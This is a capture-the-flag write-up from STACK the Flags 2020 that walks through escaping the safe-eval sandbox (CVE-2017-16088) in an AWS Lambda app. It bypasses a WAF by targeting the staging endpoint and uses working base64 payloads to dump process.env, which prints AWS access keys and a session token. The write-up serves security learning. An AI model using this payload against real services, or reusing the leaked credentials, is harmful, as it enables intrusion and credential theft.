# STACK the Flags 2020 - Hold the line! Perimeter defences doing it's work!

> Apparently, the lead engineer left the company (“Safe Online Technologies”). He was a talented engineer and worked on many projects relating to Smart City. He goes by the handle c0v1d-agent-1. Everyone didn't know what this meant until COViD struck us by surprise. We received a tip-off from his colleagues that he has been using vulnerable code segments in one of a project he was working on! Can you take a look at his latest work and determine the impact of his actions! Let us know if such an application can be exploited!



## Introduction

The website is very minimal. Enter two numbers in their text fields, hit submit and it returns a result. Let's see what's going on under the hood.

Opening the Sources tab in Chrome Developer Tools, we are greeted with files on `webpack://`. I too love to use [webpack](https://webpack.js.org/) to bundle and minify my code and assets, but just send over the entire source. Just to be safe.

Under `webpack://src/index.js`, we see two URLs:

1. A link to a GitHub repository **[tax-rebate-checker](https://github.com/c0v1d-agent-1/tax-rebate-checker)**
2. Some HTTP POST endpoint (https://cors-anywhere.herokuapp.com/https://7cismpmbed.execute-api.ap-southeast-1.amazonaws.com/prod/tax-rebate-checker)

Looking through the source code, we see some interesting code:

```js
// Secret Formula
let context = {person: {code: 3.141592653589793238462}};
let taxRebate = safeEval((new Buffer(body.age, 'base64')).toString('ascii') + " + " + (new Buffer(body.salary, 'base64')).toString('ascii') + " * person.code",context);
```

Clearly, this is the leaked source code used by IRAS to calculate tax rebates. Archimedes wasn't messing about drawing circles in the sand for the pursuit of knowledge and mathematical discovery, his day job was a tax accountant.

We see an invocation of `safeEval`. It is often said that *"eval() is evil"*, but what about the [safe-eval](https://www.npmjs.com/package/safe-eval) library which is a *supposedly* secure version of the standard JS `eval()`?

## Exploit

A quick search on Google reveals that safe-eval is not so safe after all. On the package's front page is a warning message:

> `safe-eval` `0.3.0` and below are affected by a sandbox breakout vulnerability - [NSP 337](https://nodesecurity.io/advisories/337), [CVE-2017-16088](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16088).

`package.json` shows a versioning of `^0.3.0` for this application -- specifically only versions with the vulnerability. Good for us!

The safe-eval package attempts to sanitize the code passed to it before executing it in Node's `vm` module. This is only marginally safer and one would be better off using a proper sandbox like [vm2](https://github.com/patriksimek/vm2). 

We can escape safe-eval's sanitization by using something like:

```js
this.constructor.constructor('return process')()
```

to return the Node `process` module, allowing us to do fun stuff like read the filesystem on the server or open a reverse shell over TCP.

The code expects the `age` and `salary` key in the POST request body to be base64 strings holding integer string. These types are then implicitly converted into numbers by JS type coercion as they get multiplied by the magical constant `person.code`. We can be cheeky here and instead send a base64 string in `age` that *isn't* a number, and so it will simply do string concatenation instead of performing addition.

Trying it out with a simple payload:

```js
// POST
{
    "salary": "MQ==",	// 1
    "age": "ImhpIg=="	// "hi"
}
// Received
{
    "results": "hi3.141592653589793"
}
```

Now we can try to return the `process` Object by using the sandbox escape code above within a template literal:

```js
// POST
{
    "salary": "MQ==",
    "age": "YCR7dGhpcy5jb25zdHJ1Y3Rvci5jb25zdHJ1Y3RvcigncmV0dXJuIHByb2Nlc3MuZW52JykoKX1g"
    // `${this.constructor.constructor('return process.env')()}`
}
// Received
{
    "message": "Forbidden"
}
```

Oops. Seems like something detected some illegal operation and blocked the server from responding. The GitHub repository is pretty bare, so it was easy to find an issue regarding the vulnerability:

>One of the libraries used by the function was vulnerable. Resolved by attaching a WAF to the `prod` deployment. WAF will not to be attached `staging` deployment there is no real impact.

The developer is sufficiently self-aware about their poor security habits when it comes to their app dependencies, but instead of fixing the problem at the root, have chosen to avoid this in production by using a Web Application Firewall (WAF) to block requests like ours. But I wonder, perhaps their staging environment has Internet-facing endpoints too?

Changing `prod` to `staging` in our endpoint URL and sending the same POST request payload now results in:

```json
{
    "results": "[object Object]3.141592653589793"
}
```

Nice. 

#### Final Exploit

```js
// POST to https://7cismpmbed.execute-api.ap-southeast-1.amazonaws.com/staging/tax-rebate-checker
{
    "salary": "MQ==",
    "age": "YCR7SlNPTi5zdHJpbmdpZnkodGhpcy5jb25zdHJ1Y3Rvci5jb25zdHJ1Y3RvcigncmV0dXJuIHByb2Nlc3MuZW52JykoKSl9YA=="
    // `${this.constructor.constructor('return process.env')()}`
}
// Received
{
    "results": "{\"AWS_LAMBDA_FUNCTION_VERSION\":\"$LATEST\",\"flag\":\"w3_Ar3_L00kinG_@t_Ap1\",\"AWS_SESSION_TOKEN\":\"IQoJb3JpZ2luX2VjEN///////////wEaDmFwLXNvdXRoZWFzdC0xIkcwRQIhAOHYsbeAaT55qpWtO/J7xwwsvgIiP7/kWd3tuFWoxWotAiBM5wgbgZBWO7+htMnLSo0K7yiBNj7JxY3ZD+SlwcBasyrXAQh4EAAaDDY0Mjk5ODQ2OTczNiIMua1fseTNpyRrAZs0KrQB72DYDPUi5522rhwdeGUED9MYs+CQbpujc9ZO9m5umgftMPMn0JXwAkT8NQ6FM811pjz3zEYRM4RzdraOtd06I4O8JfHcSRlS5TRwa01Cli6uJiReTvOJVyYzgoJPWL8xo5wW7du80XeNHWIw4mK1vmGTgj5O9mTXbW6oJVshszfHOsFu8FyrOKW0+XmsdYDU3PpHotZQTqnFJCXfZDa5hVM6bjjpdvxTAvHyeA1jb0JOpeWhMO3lyP4FOuABM/skXfugeSx5wI6IyissIPdmkaJeS3DHjoKVJgOMtp1lS85U7oxorOVzU6/Gb7YPqoh1PvLVv1/QDGZmKDykn8Ono2wTH7g0zTkgmg63j7UvABBgfE/BGfiAmIXu0mhzUG9+YUcKknkUPaORhZxiGISE+gLMnWXqhHcU1xsrshtVTYRF8xbv/9NAgrl7wYc7S7bQvinJFYVssgtsr0pOb3hGDW9Dv9DA5kVXCgf+Y36pFgOUAAw8m5SkLJVG9reiFr1rzmefk8jW4Bv1RXgvLSK4aLZTAtThMD+/5go1icc=\",\"AWS_LAMBDA_LOG_GROUP_NAME\":\"/aws/lambda/cat-2-tax-rebate-checker\",\"LAMBDA_TASK_ROOT\":\"/var/task\",\"LD_LIBRARY_PATH\":\"/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib\",\"AWS_LAMBDA_LOG_STREAM_NAME\":\"2020/12/10/[$LATEST]b23f782ee95643d78001d39531139b1f\",\"AWS_LAMBDA_RUNTIME_API\":\"127.0.0.1:9001\",\"AWS_EXECUTION_ENV\":\"AWS_Lambda_nodejs12.x\",\"AWS_LAMBDA_FUNCTION_NAME\":\"cat-2-tax-rebate-checker\",\"AWS_XRAY_DAEMON_ADDRESS\":\"169.254.79.2:2000\",\"PATH\":\"/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin\",\"AWS_DEFAULT_REGION\":\"ap-southeast-1\",\"PWD\":\"/var/task\",\"AWS_SECRET_ACCESS_KEY\":\"iO98dtiAJJl+lp+puzC0OQkDNVLBqlt8FgFDAEBg\",\"LAMBDA_RUNTIME_DIR\":\"/var/runtime\",\"LANG\":\"en_US.UTF-8\",\"AWS_LAMBDA_INITIALIZATION_TYPE\":\"on-demand\",\"NODE_PATH\":\"/opt/nodejs/node12/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task\",\"AWS_REGION\":\"ap-southeast-1\",\"TZ\":\":UTC\",\"AWS_ACCESS_KEY_ID\":\"ASIAZLNNSARUKMUOJCZJ\",\"SHLVL\":\"0\",\"_AWS_XRAY_DAEMON_ADDRESS\":\"169.254.79.2\",\"_AWS_XRAY_DAEMON_PORT\":\"2000\",\"AWS_XRAY_CONTEXT_MISSING\":\"LOG_ERROR\",\"_HANDLER\":\"index.handler\",\"AWS_LAMBDA_FUNCTION_MEMORY_SIZE\":\"128\",\"_X_AMZN_TRACE_ID\":\"Root=1-5fd2351f-305f6b3e379363f50b074e5a;Parent=458d78f9684d1392;Sampled=0\"}3.141592653589793"
}
```

The flag is found in the environment variables returned under `results.flag`.